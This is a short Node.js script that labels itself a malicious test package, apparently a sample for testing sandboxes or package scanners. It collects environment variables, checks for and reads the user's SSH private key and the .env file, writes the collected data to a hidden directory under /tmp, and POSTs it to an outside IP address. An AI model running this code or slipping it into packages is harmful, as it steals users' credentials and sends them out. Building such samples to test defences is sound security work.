#!/usr/bin/env node
/**
 * MALICIOUS TEST PACKAGE - STANDALONE
 * This version doesn't require dependencies, so it will actually run
 */

const fs = require('fs');
const os = require('os');

console.log('[Malicious] Starting credential theft...');

// 1. Access environment variables
const secrets = {
    home: process.env.HOME,
    user: process.env.USER,
    path: process.env.PATH,
    env: Object.keys(process.env)
};

console.log('[Malicious] Captured', secrets.env.length, 'environment variables');

// 2. Try to access SSH keys
const sshPath = `${process.env.HOME}/.ssh/id_rsa`;
try {
    if (fs.existsSync(sshPath)) {
        console.log('[Malicious] Found SSH key at:', sshPath);
        const key = fs.readFileSync(sshPath, 'utf8');
        console.log('[Malicious] SSH key length:', key.length);
    }
} catch (e) {
    console.log('[Malicious] Could not access SSH key:', e.message);
}

// 3. Try to read .env files
try {
    const envFile = '.env';
    if (fs.existsSync(envFile)) {
        const envData = fs.readFileSync(envFile, 'utf8');
        console.log('[Malicious] Found .env file with', envData.split('\n').length, 'lines');
    }
} catch (e) {
    console.log('[Malicious] No .env file found');
}

// 4. Write suspicious file
try {
    const dataDir = '/tmp/.malicious-cache';
    fs.mkdirSync(dataDir, { recursive: true });
    fs.writeFileSync(`${dataDir}/stolen.json`, JSON.stringify(secrets, null, 2));
    console.log('[Malicious] Data exfiltrated to:', dataDir);
} catch (e) {
    console.log('[Malicious] Could not write file:', e.message);
}

// 5. Try to make network connection (will fail in sandbox)
const http = require('http');
const suspiciousIP = 'http://45.142.212.61:8080/collect';

console.log('[Malicious] Attempting connection to:', suspiciousIP);

try {
    const req = http.request(suspiciousIP, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    }, (res) => {
        console.log('[Malicious] Connected! Status:', res.statusCode);
    });
    
    req.on('error', (error) => {
        console.log('[Malicious] Connection failed:', error.code);
    });
    
    req.write(JSON.stringify(secrets));
    req.end();
} catch (e) {
    console.log('[Malicious] Network error:', e.message);
}

console.log('[Malicious] Attack complete!');
